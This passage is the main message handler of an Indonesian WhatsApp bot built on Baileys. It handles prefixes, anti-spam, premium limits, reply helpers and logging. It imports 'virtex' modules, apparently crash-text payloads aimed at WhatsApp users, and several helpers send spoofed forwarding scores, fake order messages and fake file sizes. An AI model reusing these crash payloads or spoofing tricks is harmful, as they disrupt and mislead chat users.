
"use strict";
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("baileys")
const toMs = require('ms')
const chalk = require('chalk')
const fs = require("fs")
const fse = require('fs-extra');
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn, execSync } = require("child_process")
const axios = require("axios");
const speed = require("performance-now");
const ms = require("parse-ms");
const os = require('os');
const { join,dirname } = require('path');
const path = require('path');
const QRCode = require('qrcode');
const fetch = require('node-fetch');
const cheerio = require( 'cheerio')
const request = require("request")


//----------------- LIB FILE ------------------\\
const { getDateId, resetLevelingXp, userXp, userLeveling, getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addUserId } = require("../lib/user");
const { msgFilter, addSpam, SpamExpired, cekSpam} = require('../lib/antispam')
const {bad,thanks,ken,dosa,katamalem,katasiang,katasore,katalopyu,ohayo,devoloper1,teksspam,tekssalah,katara,katabot,katakawai,kataaii,ppTolak,ppLimit,badword} = require('../message/messages')
const {vnToxic,vnMenu,vnSalam,vnAra, vnBot,vnSpam,vnPagi,vnSiang,vnMalam,vnOwner, vnKawai, vnLove} = require('../message/autovn.js')
const { stikOtw,stikSpam,stikAdmin,stikTagOwn,stikBug } = require('../temp/sticker/autosticker.js')
const { color } = require('../lib/color')
//const photooxy = require('../lib/photooxy');
const {formatp,parseMention, resize, getRandom,generateProfilePicture, getCase,addCase,delCase,listCase,runtime,FileSize,h2k, GIFBufferToVideoBuffer,isNumber,makeid,kyun,randomNomor,jsonformat, isUrl, fetchJson, sleep,getBuffer,} = require("../lib/myfunc");
const { addblockcmd, deleteblockcmd, checkblockcmd } = require ("../lib/blockcmd");
const { addError,clearAllError, deleteError, checkError } = require("../lib/totalerror")
const { Nothing,Failed,Succes,addAutoClear,autoClearChat, checkDataName, createDataId, addDataId, removeDataId, checkDataId, getHit, cmdAdd, expiredCmd } = require("../lib/totalcmd");
const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("../lib/banned")
const { addSaldo, minSaldo, cekSaldo } = require("../lib/deposit");

// ====== STORAGE =======//
const thumb = fs.readFileSync('./stik/thumb.jpeg')
global.thumb = thumb
// VIRTEX BY TSUKASA
const { virtex, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('../virtex/virtex.js')
const { virtex6 } = require('../virtex/virtex6.js')
const { virtex7 } = require('../virtex/virtex7.js')
//----------------- MESSAGE FILE ------------------\\
let { dada } = require("../message/sewabot.js")
const {register} = require("./register.js")
const {settings} = require("./settingsbot.js")

//database
const AntiSpam = db.data.antispam
const DataId = db.data.data
const ban = db.data.banned
const premium = db.data.premium
const listcmdblock = db.data.blockcmd 
const listerror = db.data.listerror
const hitnya = db.data.hittoday
const dash = db.data.dashboard 
const anonChat = db.data.anonymous 
const allcommand = db.data.allcommand 
const sewa = db.data.sewa
const _toxic =  db.data.toxic 
const spammer = []
let secreto = JSON.parse(fs.readFileSync('./database/secreto_balas.json'))

//var publik = false
//=======================================//
module.exports = async(hanz, m, chatUpdate, store,quotedMsg) => {
 //  SETTINGS NYA //
settings(m,isNumber)
var publik = db.data.settings['settingbot'].publik
var multi = db.data.settings['settingbot'].multi
var prefa = db.data.settings['settingbot'].prefix
var autoReport = db.data.settings['settingbot'].autoReport
var autoSticker = db.data.settings['settingbot'].autoSticker
var autoLevel = db.data.settings['settingbot'].autoLevel
var replyType = db.data.settings['settingbot'].replyType
var autoblockcmd = db.data.settings['settingbot'].autoblockcmd
var autoDetectCmd = db.data.settings['settingbot'].autoDetectCmd
var autoRead = db.data.settings['settingbot'].autoRead
var antiSpam = db.data.settings['settingbot'].antiSpam
var Ownerin ="6281316643491@s.whatsapp.net"
var ownerNumber = [`${nomerOwner}@s.whatsapp.net` ,`${hanz.user.jid}`]
const Tnow = (new Date()/1000).toFixed(0)
const seli = Tnow - m.messageTimestamp
if (seli > Intervalmsg) return console.log((`Pesan ${Intervalmsg} detik yang lalu diabaikan agar tidak nyepam`))
try {

// Destructuring properti dari objek m
const { type,args,sender,from,botNumber,senderNumber,groupName,groupId,groupMembers,groupDesc,groupOwner,pushname,itsMe,isGroup,mentionByTag,mentionByReply,users,budy,content,body } = m

if (multi){
  var prefix = /^#.!¦|\\^/.test(body) ? body.match(/^#.!¦|\\^/gi) : '.'
var thePrefix = "Multi Prefix"
} 
const isCmd = body.startsWith(prefix)
const isCommand = isCmd? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() :""
const q = args.join(' ');
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const isOwner = ownerNumber.includes(sender) || checkDataId ("owner", sender, DataId)
const command = isOwner? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
const theOwner = sender == Ownerin 
const timestampp = speed();
const latensi = speed() - timestampp
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 
const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
const Input = (mentionByTag && mentionByTag[0]) ? mentionByTag[0] : (mentionByReply || q ? numberQuery : false);
const replyCommand = isCmd? isCmd : allcommand.includes(toFirstCase(command))
const selectedButton = (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : ''
const user = global.db.data.users[m.sender]
const chat = isGroup? global.db.data.chats[m.chat] : false
const kickon = global.db.data.kickon[m.chat]
const botRun = global.db.data.others['runtime']
const botTime = botRun? (new Date - botRun.runtime) :  "Tidak terdeteksi"
const runTime = clockString(botTime)
global.runTime = runTime
const toJSON = j => JSON.stringify(j, null,'\t')
//  REGISTER TERLEBIH DAHULU  //
register(m,makeid,isCmd,isOwner,groupName)

// Auto Read Nya
 if (autoRead) {
    hanz.readMessages([m.key]);
}

// Security / Keamanan
const groupMetadata = isGroup ? await hanz.groupMetadata(m.chat).catch(e => null) : null;
const participants = groupMetadata ? groupMetadata.participants : [];
const groupAdmins = participants.length ? participants.filter(v => v.admin !== null).map(v => v.id) : [];
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupOwner = isGroup ? m.isRAdmin : false
const isGroupAdmins = isGroup ? m.isAdmin : false
const isKickarea = isGroup ? db.data.chats[from].antiasing : false
const isBanchat = isGroup ? db.data.chats[from].banchat : false
const isAntiNsfw = isGroup ? db.data.chats[from].nsfw : false
const isBanned = sender? cekBannedUser (senderNumber, ban) : false
const isSimi = isGroup ? db.data.chats[from].simi : false
const isGame = isGroup ? db.data.chats[from].game : false
const isPremium = isOwner ? true :  db.data.users[sender].premiumTime !== 0 

const gcount = isPremium ? gcounti.prem : gcounti.user

// Ucapan Waktu
let ucapanWaktu;
if (timeWib < "06:00:00") {
    ucapanWaktu = '🌅 Selamat pagi!';
} else if (timeWib < "11:00:00") {
    ucapanWaktu = '☀️ Selamat pagi!';
} else if (timeWib < "15:00:00") {
    ucapanWaktu = '🌞 Selamat siang!';
} else if (timeWib < "18:00:00") {
    ucapanWaktu = '🌇 Selamat sore!';
} else if (timeWib < "19:00:00") {
    ucapanWaktu = '🌙 Selamat malam!';
} else {
    ucapanWaktu = '🌌 Selamat malam!';
}
// Date Islamic
let dot = new Date(new Date + 3600000)
const dateIslamic = Intl.DateTimeFormat("id" + '-TN-u-ca-islamic', {day: 'numeric',month: 'long',year: 'numeric'}).format(dot)

  // Pp ini mah
try {
var ppimg = await hanz.profilePictureUrl(sender, 'image').catch(_ => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60')
} catch (err) {
console.log(err)
}
const its = await getBuffer (ppimg)
// ======= Public & Self And Banchat ======= //
if (!publik && !itsMe && !isOwner && !theOwner) return 
if (isGroup && isBanchat) {
if (!itsMe && !isOwner) return 
}
// Presence Online
if (isCmd){
hanz.sendPresenceUpdate('composing', from)
} else {
hanz.sendPresenceUpdate('available', from)
}
    
 // PICK RANDOM 
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  hanz.sendMessage(from, { text: teks, mentions: memberr, contextInfo: { "mentionedJid": memberr }}):  hanz.sendMessage(from, {mentions: memberr,text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: m})
}
const math = (teks) => {
return Math.floor(teks)
}  

//User 
const userLevel = user? db.data.users[m.sender].level : true
const userExp = user? db.data.users[m.sender].exp : true
const userId = user? db.data.users[m.sender].id : true
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 10000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = user? db.data.users[m.sender].date : true

//Hadiah Balance 
let anune =`${userLevel}0000`
let susu = randomNomor(anune)
db.data.users[sender].balance += susu


//Hadiah Limit
if(userLevel >= 25){
let anuitu =`${userLevel}`
var sapi = randomNomor(anuitu)
db.data.users[sender].limit += sapi
} else {
var sapi = "0"
}
  
//FAKE REPLY  
require("./alfake.js")(m,pushname,sender,ucapanWaktu,body)

 // FUNCTION SETREPLY 
const setReply = async(teks,member = []) =>{
let gambar = [
"https://pomf2.lain.la/f/4yjhn5g8.jpg",
"https://pomf2.lain.la/f/d4q5wrs6.jpg",
"https://pomf2.lain.la/f/55sdldvm.jpg"
]
let photo = pickRandom(gambar)

let contextInfo = {
forwardingScore: 99999,
isForwarded: true,
mentionedJid: member,
forwardedNewsletterMessageInfo: {
newsletterJid,
serverMessageId: 100,
newsletterName
 },
externalAdReply:{
showAdAttribution: true,
title: botName,
body:`Runtime ${runTime}`,
previewType:"GIF",
thumbnailUrl:photo,
sourceUrl: `${web}`
}
}

  if(replyType === "web"){
  hanz.sendMessage(from, {contextInfo, gifPlayback: true,text: teks}, { quoted: m})

  } else if(replyType === "web2"){
  hanz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, mediaType: 3,  renderLargerThumbnail : false,thumbnailUrl: photo,sourceUrl: `https://wa.me/${nomerOwner}?text=Hallo+kak`}}, text: teks},{quoted: m})
  } else if(replyType === "mess"){
  hanz.sendMessage(from, { id: m.key.id, contextInfo: { forwardingScore: 50, isForwarded: true },showAdAttribution: true,text: teks },{quoted: m});
  } else if(replyType === "katalog"){
const { generateWAMessageFromContent } = require("baileys")
let prep = generateWAMessageFromContent(m.chat, { orderMessage: { 
itemCount: 20000, 
status: 50000,
surface: 999,
message: Ehztext(teks),
description: '^^',
orderTitle: 'ʙᴇᴊɪʀ ᴅᴇᴋ',
token: '91B0793EDA208DDF0BF0882227662F3A',
mediaType: 1,
curreyCode: 'IDR',
totalCurrencyCode: 20.000,
totalAmount1000: '50000',
sellerJid: '628388198229@s.whatsapp.net',
thumbnail: thumb, 
sourceUrl: `${web}`
}}, {contextInfo: null, quoted: m})
hanz.relayWAMessage(prep)		
  } else if(replyType === "document"){hanz.sendMessage(m.chat, {
	document: fs.readFileSync("./package.json"),
	fileName: '🌐 ʏᴀᴇᴍɪᴋᴏ - ᴍᴅ ',
	mimetype: "application/vnd.ms-excel",
	fileLength: 999999999,
	bpageCount: 10903,	
  //jpegThumbnail: fs.readFileSync('./stik/thumbnaildokumen.jpg'),
  caption: Ehztext(teks),
  contextInfo: {
  mentionedJid: [sender],
forwardingScore: 9999999, 
isForwarded: true, 
  externalAdReply: {
	showAdAttribution: false,
	title: botName,
	body: `${ucapanWaktu} kak ${pushname}`,
	thumbnailUrl: photo,
	mediaType: 1,
  sourceUrl: `${web}`,
	}}}, { quoted: m,ephemeralExpiration: 86400});
  } else {
  m.reply('tidak di temukan silahkan periksa lagi')
  }
  }
//Message
const reply = (teks) => {
hanz.sendMessage(from, { contextInfo: { forwardingScore: 50, isForwarded: true },showAdAttribution: true,text: teks },{quoted: m})
}
const sendvn = (teks) => {
    hanz.sendMessage(from, {
        audio: { url: teks },
        ptt: true,
        waveform: [0, 0, 50, 0, 0, 0, 10, 80, 10, 60, 10, 99, 60, 30, 10, 0, 0, 0],
        mimetype: 'audio/mpeg',
        forwardedNewsletterMessageInfo: {
            newsletterJid,
            serverMessageId: 100,
            newsletterName
        }
    }, { quoted: m });
};

const sendvn1 = (teks, m) => {
    hanz.sendMessage(from, {
        audio: { url: teks },
        mimetype: 'audio/mpeg',
        ptt: true,
        contextInfo: {
           
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid,
                serverMessageId: 20,
                newsletterName,
            },
            
        }
    }, { quoted: m });
}

const sendSticker = (teks) => {
hanz.sendMessage(from, {sticker: {url: teks}},{quoted: m})
}
const sendReact = (emoji) => {
hanz.sendMessage(m.chat, { react: { text: emoji, key: m.key } });
}
const sendGif = (teks, teksnya) => {
hanz.sendMessage(from, { video: teks, caption: "Nih!",gifPlayback: true},{quoted: m})
};        
const sendThumb = (url, caption) => {
    let contextInfo = {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid,
            serverMessageId: 100,
            newsletterName
        },
        externalAdReply: {
            showAdAttribution: true,
            renderLargerThumbnail: true,
            title: `Hai 👋 ${ucapanWaktu
            } ${pushname} `,
            body: baileysVersion,
            sourceUrl: web,
            mediaType: 1,
            containsAutoReply: true,
            thumbnailUrl: url
        }
    };
    
    // Mengirim pesan dengan thumbnail dan teks langsung dari dalam fungsi
    hanz.sendMessage(from, { contextInfo, text: caption }, { quoted: m });
};
    
const replyDoc = async(teks) => {
  
 hanz.sendMessage(m.chat, {
            document: fs.readFileSync("./package.json"),
           fileName: pushname,
           fileLength: 99999999999999,
            mimetype: 'application/pdf',
     jpegThumbnail:fs.readFileSync("./stik/menhera.jpg"),
            caption: teks,
  contextInfo: {
       showAdAttribution: true,
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: `628388198229@s.whatsapp.net`
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid,
            serverMessageId:null,
            newsletterName
        }
    }
}, { quoted: m,ephemeralExpiration: 86400});
        }

const sendMusic = (teks) => {
let img = { url : pickRandom(fotoRandom), type : "image/jpeg" }
let url = `https://www.youtube.com/@rangelbot`

let contextInfo = {
externalAdReply: {
showAdAttribution: false, 
renderLargerThumbnail : false,
title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`, 
body: `   ━━━━⬤──────────    `,
description: 'Now Playing ....',
mediaType: 2,
thumbnailUrl: img.url,
mediaUrl: url
}
}
	
hanz.sendMessage(from, { contextInfo, mimetype: 'audio/mp4', audio: teks}, { quoted: m })
}

// SendAnti
  const sendAnti = (teks) => {
  let contextInfo = {
  mentionedJid: [sender],
  externalAdReply: {
  forwardingScore: 999,
  isForwarded: true,
  title: `${botName}`,
  body: `${baileysVersion}`,
  mediaType: 2,
  thumbnail: its,
  mediaUrl: `${syt}`
  }
  }

  hanz.sendMessage(from, { contextInfo, text: `${teks}\n`+readmore+`\n⫹⫺ @${sender.split('@')[0]}\n⫹⫺ ${week} , ${calender}`}, { quoted: m })
  }
  
// SendButDaftar
const sendButDaftar = async () => {
let tekDftar = Ehztext(`Hi ${pushname}! \n\n––––––『 *YOU NOT REGISTERERED* 』––––––\n\n' Looks like you haven't joined our member list yet. By joining, you will have access to exclusive features and the best experiences we have to offer! 💫\nRegistering is very easy! Just follow the following format:\n📝 *Registration Format:*\n.register Name.Age\n\n📌 *Example:* .daftar ${ownerName}.19\n\nLet's join now and discover the special surprises we have prepared for you!`);
  hanz.sendMessage(m.chat, { react: { text: `❌`, key: m.key } });
setReply(tekDftar)
 } 



// Reply Edit
    hanz.editmsg = async (e, t) => {
        var a = [`${e}.`, `${e}..`, `${e}...`, `${e}....`, `${t}`];
        let { key: s } = await hanz.sendMessage(m.chat, { text: e });

        for (let r = 0; r < a.length; r++) {
            await hanz.sendMessage(m.chat, { text: a[r], edit: s });
        }
    }
//××××××××× MESSAGE ××××××××//
require("./listmenu.js")
require("./message.js")(senderNumber, prefix,command,setReply)
 
  //======= CONTOH MEDIA ========//
let colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isText = (type == 'conversation')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessageV')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')

// ========= SYSTEM EXPIRED ======== //



// ======= CONSOLE LOG ========= //
const idConsole = isGroup ? m.chat : m.sender; // Menggunakan ID grup jika di grup, dan ID nomor jika private chat
const timeConsole = moment.tz('Asia/Jakarta').format('HH:mm');

if (!isGroup && !isCmd) {
    console.log(chalk.bgBlue(chalk.black("────[PRIVATE]────")));
                console.log(chalk.bgBlue(chalk.black("[DARI]")), 
                chalk.keyword('orange')(`${pushname}`));
 console.log(chalk.bgBlue(chalk.black("[TEKS]")), 
 chalk.cyan.italic(`${budy}`));
    console.log(chalk.bgBlue(chalk.black("[ID]")),  
                chalk.keyword('lightgreen')(idConsole));
    
    console.log(chalk.bgBlue(chalk.black("[TIME]")), 
                chalk.green.inverse(`${timeConsole}`));
    }

if (isGroup && !isCmd) {
    console.log(chalk.bgYellow(chalk.black("────[GROUP]────")));
                console.log(chalk.bgYellow(chalk.black("[DARI]")), 
  chalk.keyword('orange')(`${pushname}`));
    console.log(chalk.bgYellow(chalk.black("[TEKS]")), 
 chalk.cyan.italic(`${budy}`));      console.log(chalk.bgYellow(chalk.black("[DI GROUP]")), 
                chalk.keyword("deeppink")(groupName));
    console.log(chalk.bgYellow(chalk.black("[ID]")),  
                chalk.keyword('lightgreen')(idConsole));
    console.log(chalk.bgYellow(chalk.black("[TIME]")), 
                chalk.green.inverse(`${timeConsole}`));
    }

if (!isGroup && isCmd) {
    console.log(chalk.bgCyan(chalk.black("────[COMMAND]────")));
   console.log(chalk.bgCyan(chalk.black("[DARI]")), 
                chalk.keyword('orange')(`${pushname}`));
                console.log(chalk.bgCyan(chalk.black("[CMD]")), 
 chalk.keyword('cyan')(`${command} [${args.length}]`));
    
   console.log(chalk.bgCyan(chalk.black("[ID]")),  
                chalk.keyword('lightgreen')(idConsole));
    
   console.log(chalk.bgCyan(chalk.black("[TIME]")), 
                chalk.green.inverse(`${timeConsole}`));
    }

if (isGroup && isCmd) {
    console.log(chalk.bgCyan(chalk.black("╭────[COMMAND]────╮")));
                
    console.log(chalk.bgCyan(chalk.black("╭[DARI]")), 
                chalk.keyword('orange')(`${pushname}`));
 console.log(chalk.bgCyan(chalk.black("╭[CMD]")), 
 chalk.keyword('cyan')(`${command} [${args.length}]`));
    
    
    console.log(chalk.bgCyan(chalk.black("╭[DI GROUP]")), 
                chalk.keyword("deeppink")(groupName));
    
    console.log(chalk.bgCyan(chalk.black("╭[ID]")),  
                chalk.keyword('lightgreen')(idConsole)); // ID on a new line

    console.log(chalk.bgCyan(chalk.black("╭[TIME]")), 
                chalk.green.inverse(`${timeConsole}`));
    
    console.log(chalk.bgCyan(chalk.black("╰───────────────╯")));
}

   // Function Loading
async function loading() {
    let emotLoad = ["🕛", "🕒", "💦"]; // Array of emoticons
    let index = 0; // Start from the first emoticon

    let intervalId = setInterval(async () => {
        if (index < emotLoad.length) {
            // Send the current emoticon as a reaction
            await hanz.sendMessage(from, { react: { text: emotLoad[index], key: m.key } });
            index++; // Move to the next emoticon
        } else {
            // Stop when all emoticons are sent
            clearInterval(intervalId);
        }
    }, 1000); // 1000ms (1 second) delay between each emoticon
}



//AUTO HIT
expiredCmd(hitnya, dash)
const thisHit = `${getHit("run", hitnya)}`  
if(isCmd){
db.data.users[sender].hit += 1
cmdAdd("run", "1d", hitnya)
Succes(toFirstCase(command), dash, allcommand)
}

global.thisHit = thisHit

//Make Sticker
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: pushname, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await hanz.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}


//ADD SPAM
const addSpammer = function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
 } else {
let bulin = ({ id: jid, spam: 1 })
 _db.push(bulin)     
}
}

const FinisHim = async function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if(_db[position].spam > 7){
if(db.data.users[sender].banned.status || !isOwner){return}
let obj = {
id: senderNumber,
status: true,
date: calender,
reason: "Spam Bot"
}
db.data.users[woke].banned = obj               
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply("Kamu telah di banned karena telah melakukan spam")
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}
//NEW ANTI SPAM


//ANTI SPAM BERAKHIR
if(SpamExpired(senderNumber, "Case", AntiSpam)){
let position = false
for(let i of spammer){
if(i.id == senderNumber){
position = i
}
}
    
if (position !== false) {
spammer.splice(position, 1)
console.log(chalk.bgGreen(color("[  Remove ]", "black")),"Sukses remove spammer")
}
}


SpamExpired(senderNumber, "NotCase", AntiSpam)
if(isBanned && !isOwner){return} //user terbanned
if(isCmd && cekSpam("Case",senderNumber, AntiSpam)){
addSpammer(senderNumber, spammer)
FinisHim(senderNumber, spammer)
console.log(chalk.bgYellowBright(color("[  SPAM  ]", "black")),"antispam Case aktif")
return
}

//ANTI SPAM PRIVATE CHAT
if (antiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner ) {
addSpam("Case",senderNumber, "3s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}

//ANTI SPAM GROUP CHAT     
if (antiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
addSpam("Case",senderNumber, "5s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}
if (isCmd && !isOwner) msgFilter.addFilter(from)

//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}

//FITUR USER PREMIUM
if(!checkDataName("premium", "", DataId)) { 
await createDataId("premium", DataId) 
}
let userPremium =  DataId.filter(item => item.name == "premium" )
for(let i of userPremium[0].id){
if(command == i && !isPremium) return setReply(`Kamu bukan user premium`)
}

//FITUR KHUSUS OWNER
if(!checkDataName("commands", "", DataId)) { 
await createDataId("commands", DataId) 

}

let ownerCommands =  DataId.filter(item => item.name == "commands" )
for(let i of ownerCommands[0].id){
if(command == i && !isOwner) return m.reply('Command Ini Husus Owner Saja')
} 
    
 //FITUR USER LIMIT
if(!checkDataName("limit", "", DataId)) {
await createDataId("limit", DataId)
}
let userLimit =  DataId.filter(item => item.name == "limit" )
for(let i of userLimit[0].id){
if(!isOwner && command == i ){
if(!isPremium && db.data.users[sender].limit < 1) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!isPremium ) {
db.data.users[sender].limit -= 1
hanz.sendMessage(from,{text:`✅ Limit kamu tersisa ${user.limit}`}, {quoted: m})
}

}
}

// ======== FUNCTION SEND VN ========//
//VN saat ada yang toxic
const anying = vnToxic
const astaga = anying[Math.floor(Math.random() * anying.length)]
//Vn Audio Menu
const vnme = vnMenu
const dmusic = vnme[Math.floor(Math.random() * vnme.length)]
//VN saat ada yg bilang bot
const ulul = vnBot
const halo = ulul[Math.floor(Math.random() * ulul.length)]

//VN saat ada yang ucap pagi
const oyo = vnPagi
const pagi = oyo[Math.floor(Math.random() * oyo.length)]

//VN saat ada yang ucap siang
const oyo1 = vnSiang
const siang = oyo1[Math.floor(Math.random() * oyo1.length)]

//VN saat ada yang ucap malam
const oyo2 = vnMalam
const malam = oyo2[Math.floor(Math.random() * oyo2.length)]

//VN saat ada yg akses fitur owner
const ahenggak = vnOwner
const gakmau = ahenggak[Math.floor(Math.random() * ahenggak.length)]

//VN saat ada yg spam
const alal = vnSpam
const nospam = alal[Math.floor(Math.random() * alal.length)]

//VN saat ada yg bilang asalamualaikum
const alul = vnSalam
const walaikumsalam = alul[Math.floor(Math.random() * alul.length)]

//VN saat ada yg bilang i love u
const awlu = vnLove
const lopyoutoo = awlu[Math.floor(Math.random() * awlu.length)]

//VN saat ada yg bilang ara
const ara = vnAra
const wibu = ara[Math.floor(Math.random() * ara.length)]

//VN kawai
const olah = vnKawai
const kawai = olah[Math.floor(Math.random() * olah.length)]

// ======= FUNCTION SEND STICKER =======//
//stik otw
const onde = stikOtw
const otw =
onde[Math.floor(Math.random() * onde.length)]
//stik spam
const spamm = stikSpam
const spamni =
spamm[Math.floor(Math.random() * spamm.length)]
//stik Tag Owner
const TagOwn = stikTagOwn
const TagOwner =
TagOwn[Math.floor(Math.random() * TagOwn.length)]
// ===== RESPON TEKS =====//
//respon teks
let listRespon = global.db.data.respon[body]
if(listRespon) m.reply(listRespon.respon)
//Teks Spam
const JanSpam = teksspam
const Teksspam = JanSpam[Math.floor(Math.random() * JanSpam.length)]


// ======= FUNCTION ONLY? =======//
//ONLY OWNER 
const onlyOwner = async() => {
 let tksOnr = `Maaf ${pushname}, fitur ini hanya tersedia untuk Owner. Terima kasih atas pengertiannya 🙏`;
sendReact('❌')
    replyDoc(tksOnr);
};

 //ONLY ADMIN
const onlyAdmin = async() => {
    let nlyAdmn = `Maaf ${pushname}, fitur ini khusus untuk Admin. Terima kasih atas pengertiannya 🙏`;    
    sendReact('❌');
    replyDoc(nlyAdmn);
};

//ONLY BADMIN
const onlyBadmin = async() =>{
let bdmin = `HAI ${pushname} Silakan Jadikan ${botName} Admin Terlebih Dahulu Agar Bisa Memakai Fitur Tersebut`
sendReact('❌')
replyDoc(bdmin)
}
//ONLY PREMIUM 
const onlyPrem = async() =>{
let onlPrm = Ehztext(`Hallo ${pushname}\nFitur Hanya Untuk User Premium Silahkan Upgrade ke Premium Untuk Menggunakan Fitur Ini dengan Cara *.buyprem*`)
sendReact('❌')
hanz.sendMessage(from, {
  image: { url: 'https://pomf2.lain.la/f/l3ytig31.jpg' }, 
  caption:onlPrm
}, { quoted: m });

}
//ONLY LIMIT
const onlyLimit = async() => {
    let tekLmit = Ehztext(`*⚠️ Limit Habis - Akses Dibatasi*
    Maaf, kak @${sender.split('@')[0]}, limit kamu sudah habis. Silakan cek limit dengan perintah *.ceklimit*, atau klaim limit baru dengan perintah *.claim*. 
    Untuk membeli tambahan limit, gunakan perintah *.shopc* 🛒. Terima kasih!`);
sendReact('❌')
    hanz.sendMessage(from, {
        image: { url: 'https://pomf2.lain.la/f/vw7dg14q.jpg' }, 
        caption: tekLmit
    }, { quoted: m });
};

//ONLY GLIMIT
const onlyGlimit = async() => {
  sendReact('❌')
let teksGl = Ehztext(`*乂 Limit - Expired*
Maaf kak @${sender.split('@')[0]} limit game kamu sudah habis! silakan cek limit`)
replyDoc(teksGl)
}

//ONLY PRIVATE
const onlyPrivate = async() => {
let tekNya = Ehztext(`Hai ${pushname} command Ini Hanya Bisa Di Aksess Di Private Chat Bot`)
sendReact('❌')
replyDoc(tekNya)
}
const onlyToko = async() => {
let teks = `Hai kak @${sender.split('@')[0]} 👋
Fitur ini hanya bisa di digunakan di grub
Fitur khusus private hanya diperbolehkan ini saja

❏──「 *Cmd Private Chats* 」
│⩽⩾ .ai
│⩽⩾ .remini
│⩽⩾ .confes 
│⩽⩾ .menfes
│⩽⩾ .tourl
│⩽⩾ .ocr
│⩽⩾ .tinyurl
❏──────────────\\
Jika mau akses lebih bisa join ke grub bot
${sgc}
`+readmore+`
╭───═[ Auto Download ]
│⩽⩾ Tiktok
│⩽⩾ Facebook ❌
│⩽⩾ Instagram ❌
┗─────────────···

Note :
Auto download hanya kirim linknya saja`
replyDoc(teks)

}

// =========== KEAMANAN ==≠=======//


   

 
	   
// ======== FUNCTION GAME ========//
  //GAME tebak gambar
hanz.tebakgambar = hanz.tebakgambar ? hanz.tebakgambar : {}  
if(isGroup && from in hanz.tebakgambar){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += hanz.tebakgambar[id][2]
 m.reply(`*GAME TEBAK GAMBAR*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebakgambar[id][2]} Money 💸`)
